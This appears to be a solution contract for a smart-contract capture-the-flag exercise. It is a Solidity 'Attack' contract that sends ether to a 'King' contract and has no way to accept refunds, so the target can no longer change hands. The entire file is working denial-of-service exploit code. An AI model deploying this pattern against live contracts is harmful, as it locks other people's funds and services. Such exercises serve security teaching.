// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Attack {
    King target;

    constructor(address payable  _target) payable {
        target = King(_target);
    }

    function brick() public {
        (bool sent, ) = payable(target).call{value: address(this).balance}("");
        require(sent);
    }
}